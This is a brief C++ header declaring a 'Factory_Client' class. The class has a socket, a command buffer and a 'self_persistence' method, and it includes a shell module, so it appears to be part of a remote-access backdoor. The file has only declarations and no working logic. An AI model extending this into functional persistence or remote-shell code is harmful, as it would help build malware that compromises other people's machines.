#pragma once
#include "Client.h"
#include "Shell.h"
#define BUFFER_LEN 256

class Factory_Client
{
private:
	std::vector<std::string> args;
	const std::string buffer;
	SOCKET* sock;
public:
	Factory_Client(SOCKET* client, const char* pbuffer);
	void arg_self_persistence();

};

